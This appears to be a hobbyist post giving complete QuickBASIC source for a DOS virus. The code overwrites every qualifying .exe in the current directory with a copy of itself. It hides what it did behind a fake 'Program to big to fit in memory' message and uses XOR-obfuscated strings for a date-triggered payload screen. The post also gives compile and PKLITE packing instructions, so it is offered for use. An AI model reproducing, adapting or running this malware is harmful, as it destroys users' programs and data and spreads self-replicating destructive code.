A QB Virus

Tis virus simply overwrites all the EXE's in the current DIR using DOS, it also uses a small assembly routine to "find itself" you must use QB 4.5 to compile it then after you compile (be sure to load QB with the /l switch) just run it, you may try using PKLITE on it and recording the new file size then changing the 43676 to whatever the new size is.... 

DEFINT A-Z 
'$INCLUDE: 'qb.bi' 
DECLARE FUNCTION ProgramName$ () 
SHELL "DIR /b *.exeÈ&uml;È" 
OPEN "È&uml;È" FOR BINARY AS #1 
IF LOF(1) = 0 THEN CLOSE : KILL "È&uml;È": GOTO endit 
CLOSE 
OPEN "È&uml;È" FOR INPUT AS #1 
1 LINE INPUT #1, host$ 
GOSUB infect 
endit: 
crdate$ = "ŒÀ”œÕ" 
FOR i = 1 TO LEN(crdate$) 
cdate$ = cdate$ + CHR$(ASC(MID$(crdate$, i, 1)) XOR &HFE) 
NEXT 
IF MID$(DATE$, 1, 5) = cdate$ THEN GOSUB message 
PRINT "Program to big to fit in memory" 
END 
infect: 
OPEN host$ FOR BINARY AS #2 
IF LOF(2) < 1200 OR LOF(2) = 43676 OR LOF(2) = 0 THEN CLOSE : GOTO 1 
CLOSE 
doit$ = "copy " + ProgramName$ + " " + host$ + "nul" 
SHELL doit$ 
CLOSE : GOSUB endit 
END 
message: 
CLS 
FOR i = 1 TO 25 * 19.2 
PRINT "&deg;&plusmn;&sup2;€"; 
COLOR RND * 14 + 1 
NEXT 
DO: LOOP UNTIL INKEY$ < "" 
CLS 
PRINT 
msg$ = "ˆÓﬂÃÀŸ‘ç‰‰ç...Ó"çú""öçÔ‘-ç˘»Œ≈√¬ç˝≈ÿ√∆&sect;" 
FOR i = 1 TO 37 
PRINT CHR$(ASC(MID$(msg$, i, 1)) XOR &HAD); 
NEXT 
FUNCTION ProgramName$ STATIC 
DIM Regs AS RegType                       'Allocate space for TYPE 
                                             '  RegType 
Regs.ax = &H5100                          'DOS function 51h 
Interrupt &H21, Regs, Regs                '  Get PSP Address 
DEF SEG = Regs.bx                         'Regs.bx returns PSP sgmnt. 
EnvSeg% = PEEK(&H2C) + PEEK(&H2D) * 256   'Get environment address 
DEF SEG = EnvSeg%                         'Set environment address 
DO 
Byte% = PEEK(Offset%)                  'Take a byte 
IF Byte% = 0 THEN                      'Items are ASCIIZ 
Count% = Count% + 1                 '  terminated 
IF Count% AND EXEFlag% THEN         'EXE also ASCIIZ terminated 
EXIT DO                          'Exit at the end 
ELSEIF Count% = 2 THEN              'Last entry in env. is 
EXEFlag% = -1                    '  terminated with two 
Offset% = Offset% + 2            '  NULs.  Two bytes ahead 
END IF                              '  is the EXE file name. 
ELSE                                   'If Byte% < 0, reset 
Count% = 0                          '  zero counter 
IF EXEFlag% THEN                    'If EXE name found, 
Temp$ = Temp$ + CHR$(Byte%)      '  build string 
END IF 
END IF 
Offset% = Offset% + 1                  'To grab next byte... 
LOOP                                      'Do it again 
DEF SEG                                   'Reset default segment 
ProgramName$ = Temp$                      'Return value 
Temp$ = ""                                'Clean up 
END FUNCTION 